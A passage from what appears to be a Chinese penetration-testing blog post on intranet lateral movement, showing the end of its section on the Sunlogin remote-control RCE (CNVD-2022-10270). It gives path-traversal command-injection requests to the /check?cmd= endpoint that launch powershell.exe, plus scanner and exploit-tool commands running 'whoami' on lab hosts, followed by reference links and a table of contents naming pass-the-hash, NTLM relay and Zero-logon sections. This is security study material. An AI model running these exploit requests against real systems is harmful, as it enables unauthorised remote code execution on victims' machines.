+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: CID&#x3D;DTOAQFngEPZBDNNp5QLOYftzErN7RBCA</span><br></pre></td></tr></table></figure>
+
+<p>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check?cmd&#x3D;ping..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20pwd</span><br><span class="line">或</span><br><span class="line">&#x2F;check?cmd&#x3D;nslookup..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fsystem32%2FWindowsPowerShell%2Fv1.0%2Fpowershell.exe+%20pwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821115235266.png" alt="image-20220821115235266"></p>
+</li>
+<li><p>工具扫描</p>
+<ol>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/Mr-xn/sunlogin_rce/tree/new">sunlogin_rce</a></p>
+<p>探测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\xrkRce.exe -h 192.168.119.151&#x2F;24 -p 40000-65535</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821114721261.png" alt="image-20220821114721261"></p>
+<p>利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\xrkRce.exe -h 192.168.119.151 -p 51968 -c whoami -t rce</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821114729062.png" alt="image-20220821114729062"></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/mrknow001/Sunlogin-rce">Sunlogin-rce</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python .\sunlogin-fuzz.py -t 192.168.119.0&#x2F;24</span><br><span class="line">python .\sunlogin-fuzz.py -t 192.168.119.151</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821115649333.png" alt="image-20220821115649333"></p>
+</li>
+<li><p>sunlogin-exp-gui-v1-0.jar</p>
+<ul>
+<li><p>填入ip，指定端口40000-65535，portscan扫描端口</p>
+</li>
+<li><p>将爆破出来的ip+端口填入下方，attack即可</p>
+</li>
+</ul>
+<p><img src="https://blog-pho.oss-cn-shanghai.aliyuncs.com/blog/image-20220821120056619.png" alt="image-20220821120056619"></p>
+</li>
+</ol>
+</li>
+</ul>
+<h3 id="配置文件解密"><a href="#配置文件解密" class="headerlink" title="配置文件解密"></a>配置文件解密</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/csdnmmd/article/details/125340352">https://blog.csdn.net/csdnmmd/article/details/125340352</a></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
+<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/njaM3BwcUWz75YaPI-KNHQ">实战 | 无视杀软使用远控工具进行横向移动Tips</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://myzxcg.com/2021/09/%E7%BB%84%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8%E4%B8%8E%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">组策略利用与横向移动</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaofengdada/article/details/125697536">复现CNVD-2022-10270（ 向日葵远程代码执行漏洞）</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38162031/article/details/123301952">向日葵远控远程代码执行漏洞工具</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/Mr-xn/sunlogin_rce/tree/new">https://github.com/Mr-xn/sunlogin_rce/tree/new</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/mrknow001/Sunlogin-rce">https://github.com/mrknow001/Sunlogin-rce</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ruoli-s/p/15936972.html">向日葵远程代码执行漏洞（RCE）复现 </a></p>
+</li>
+</ul>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://hackerqwq.github.io">HacKerQWQ</a>
+            <p>原文链接：<a href="https://hackerqwq.github.io/2022/07/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">https://hackerqwq.github.io/2022/07/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</a>
+            <p>发表日期：<a href="https://hackerqwq.github.io/2022/07/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">July 27th 2022, 8:42:10 pm</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2022/07/27/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">August 21st 2022, 3:03:10 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2022/08/18/%E5%AF%8C%E6%96%87%E6%9C%AC%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" title= "富文本编辑器漏洞整理">
+                    <div class="nextTitle">富文本编辑器漏洞整理</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2022/07/18/javaweb%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" title= "javaweb代码审计学习(OGNL表达式注入)">
+                    <div class="prevTitle">javaweb代码审计学习(OGNL表达式注入)</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:a785745707@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/HacKerQWQ" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                  
+                  <img class="profile-qr" src="/assets/Misaka.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Zero-logon"><span class="toc-number">1.1.</span> <span class="toc-text">Zero-logon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.1.2.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">1.1.3.</span> <span class="toc-text">利用过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PTH%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.</span> <span class="toc-text">PTH攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mimikatz"><span class="toc-number">1.2.1.</span> <span class="toc-text">mimikatz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8Metasploit%E8%BF%9B%E8%A1%8CPTH%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.2.</span> <span class="toc-text">使用Metasploit进行PTH攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crackmapexec%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.3.</span> <span class="toc-text">crackmapexec进行攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8WmiExec%E8%BF%9B%E8%A1%8CPTH%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.4.</span> <span class="toc-text">利用WmiExec进行PTH攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Invoke-Thehash%E8%BF%9B%E8%A1%8CPth%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.5.</span> <span class="toc-text">利用Invoke-Thehash进行Pth攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM-hash-Relay"><span class="toc-number">1.3.</span> <span class="toc-text">NTLM hash Relay</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LLMNR%E5%92%8CNetBIOS%E6%AC%BA%E9%AA%97"><span class="toc-number">1.3.1.</span> <span class="toc-text">LLMNR和NetBIOS欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8WPAD%E5%8A%AB%E6%8C%81"><span class="toc-number">1.3.2.</span> <span class="toc-text">利用WPAD劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8LLMNR-NBNS%E6%8A%95%E6%AF%92"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">利用LLMNR&#x2F;NBNS投毒</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.3.2.1.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.2.1.2.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-1"><span class="toc-number">1.3.2.1.3.</span> <span class="toc-text">利用过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-Relay"><span class="toc-number">1.3.3.</span> <span class="toc-text">SMB Relay</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">利用原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#responder%E8%BF%9B%E8%A1%8CSMB-Relay"><span class="toc-number">1.3.4.</span> <span class="toc-text">responder进行SMB Relay</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B-2"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">利用过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">攻击总结</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#smbrelay%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.4.3.</span> <span class="toc-text">smbrelay脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%BA%94%E7%94%A8"><span class="toc-number">1.3.4.4.</span> <span class="toc-text">实际应用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit%E7%9A%84smb-relay%E6%A8%A1%E5%9D%97"><span class="toc-number">1.3.4.5.</span> <span class="toc-text">Metasploit的smb_relay模块</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Impacket%E7%9A%84ntlmrelayx%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.4.6.</span> <span class="toc-text">Impacket的ntlmrelayx进行攻击</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">组策略利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E5%8F%91msi"><span class="toc-number">1.4.1.</span> <span class="toc-text">下发msi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A8%E5%87%BA%E7%89%B9%E5%AE%9A%E7%9A%84%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.4.2.</span> <span class="toc-text">推出特定的启动脚本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.4.3.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GPP"><span class="toc-number">1.4.4.</span> <span class="toc-text">GPP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E6%96%B9%E5%BC%8F"><span class="toc-number">1.4.4.1.</span> <span class="toc-text">密码破解方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#kali%E5%91%BD%E4%BB%A4"><span class="toc-number">1.4.4.1.1.</span> <span class="toc-text">kali命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#msf%E6%A8%A1%E5%9D%97"><span class="toc-number">1.4.4.1.2.</span> <span class="toc-text">msf模块</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PowerSploit"><span class="toc-number">1.4.4.1.3.</span> <span class="toc-text">PowerSploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.5.</span> <span class="toc-text">脚本利用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="toc-number">2.</span> <span class="toc-text">远程登录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%94%9FSMB"><span class="toc-number">2.1.</span> <span class="toc-text">原生SMB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.1.</span> <span class="toc-text">简单命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smblient"><span class="toc-number">2.1.2.</span> <span class="toc-text">smblient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smbexec"><span class="toc-number">2.1.3.</span> <span class="toc-text">smbexec</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PSExec"><span class="toc-number">2.2.</span> <span class="toc-text">PSExec</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FTP"><span class="toc-number">2.3.</span> <span class="toc-text">FTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GotoHTTP"><span class="toc-number">2.4.</span> <span class="toc-text">GotoHTTP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rustdesk"><span class="toc-number">2.5.</span> <span class="toc-text">Rustdesk</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Todesk"><span class="toc-number">2.6.</span> <span class="toc-text">Todesk</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.6.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85%E5%91%BD%E4%BB%A4"><span class="toc-number">2.6.2.</span> <span class="toc-text">安装命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">2.6.3.</span> <span class="toc-text">利用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%AA%E5%AE%89%E8%A3%85todesk"><span class="toc-number">2.6.3.1.</span> <span class="toc-text">未安装todesk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%8E%86%E5%8F%B2%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95"><span class="toc-number">2.6.3.2.</span> <span class="toc-text">获取历史连接记录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E6%B3%95%E8%8E%B7%E5%8F%96%E5%AF%86%E7%A0%81%E6%83%85%E5%86%B5"><span class="toc-number">2.6.3.3.</span> <span class="toc-text">无法获取密码情况</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.6.4.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%91%E6%97%A5%E8%91%B5"><span class="toc-number">2.7.</span> <span class="toc-text">向日葵</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CNVD-2022-10270-CNVD-2022-03672"><span class="toc-number">2.8.</span> <span class="toc-text">远程代码执行漏洞(CNVD-2022-10270&#x2F;CNVD-2022-03672)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%A7%A3%E5%AF%86"><span class="toc-number">2.8.1.</span> <span class="toc-text">配置文件解密</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">3.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
